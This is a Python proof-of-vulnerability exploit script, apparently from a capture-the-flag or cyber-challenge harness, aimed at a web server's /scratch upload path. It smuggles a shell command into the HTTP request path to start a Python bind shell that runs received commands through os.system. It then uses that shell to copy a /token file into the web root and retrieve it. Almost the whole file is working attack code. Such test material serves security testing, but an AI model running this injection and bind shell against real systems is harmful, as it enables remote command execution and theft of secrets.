import sys
import socket
import random
import time
import string
import base64
import os
import datetime
import string
import struct
import signal

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely Successful')
    exit(0)

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = b''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1)
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, b'\n')

connect_port = 9997

def throw_sploit(HOST, PORT):
    s = connect( HOST, PORT )

    data = b'a'*2000

    '''
    > PUT /scratch/hello;python3%20-c%20%22import%20socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((str(),9998));s.listen(5);client,address=s.accept();import%20os;os.system(client.recv(1024));client.close();s.close();%22 HTTP/1.1
    > Host: localhost:8000
    > User-Agent: curl/7.68.0
    > Accept: */*
    > Content-Length: 2459
    > Expect: 100-continue
    '''
    req = b'PUT /scratch/hello;python3%20-c%20%22import%20socket;s='
    req += b'socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((str(),%d))' %(connect_port)
    req += b';s.listen(5);client,address=s.accept();import%20os;os.system(client.'
    req += b'recv(1024));client.close();s.close();%22 HTTP/1.1\r\n'
    req += b'Host: %s:%d\r\n' %(HOST.encode('UTF-8'),PORT) 
    req += b'User-Agent: whatever\r\n'
    req += b'Accept: */*\r\n'
    req += b'Content-Length: %d\r\n' %(len(data))
    req += b'\r\n'

    s.send(req)
    print(req)
    s.send(data)

    y = RU(s, b'\r\n\r\n')

    print(y)
    s.close()

    if y.find(b'201') == -1:
        print('Is the file already there? Continuing')

    s = connect(HOST, PORT)

    '''
    > GET /scratch/hello;python3%20-c%20%22import%20socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((str(),9998));s.listen(5);client,address=s.accept();import%20os;os.system(client.recv(1024));client.close();s.close();%22 HTTP/1.1
    > Host: localhost:8000
    > User-Agent: curl/7.68.0
    > Accept: */*
    > Accept-Encoding: gzip
    > Source: Hello
    '''
    req = b'GET /scratch/hello;python3%20-c%20%22import%20socket;s='
    req += b'socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind'
    req += b'((str(),%d));s.listen(5);client,address=s.accept();impo' %(connect_port)
    req += b'rt%20os;os.system(client.recv(1024));client.close();s.close();%22 HTTP/1.1\r\n'
    req += b'Host: %s:%d\r\n' %(HOST.encode('UTF-8'), PORT)
    req += b'User-Agent: whatever\r\n'
    req += b'Accept: */*\r\n'
    req += b'Accept-Encoding: gzip\r\n'
    req += b'Source: Hello\r\n\r\n'

    ## Sent the request so it should be listening now
    s.send(req)
    print(req)

    time.sleep(5)
    fail = 0
    try:
        t = connect(HOST, connect_port)
        t.send(b'cat /token > /usr/local/nginx/html/scratch/token.html\n')
        t.close()
    except:
        print('Failed to connect to {0}:{1}'.format(HOST, connect_port))
        fail = 1

    y = s.recv(1024)
    print(y)

    print('Sleeping\n')
    time.sleep(5)
    s.close()

    s = connect(HOST, PORT)

    req = b'GET /scratch/token.html\r\n'
    req += b'Host: %s:%d\r\n' %(HOST.encode('UTF-8'), PORT)
    req += b'User-Agent: whatever\r\n'
    req += b'Accept: */*\r\n\r\n'

    s.send(req)

    y = s.recv(1024)
    s.close()

    if fail:
        return 0
    else:
        print('TOKEN: ',y)
        print('POV Succeeded')
        exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(200)

    throw_sploit(HOST, PORT)
    throw_sploit(HOST, PORT)

    print('[FAIL] PoV failed')
    
    


if __name__ == '__main__':
    main()
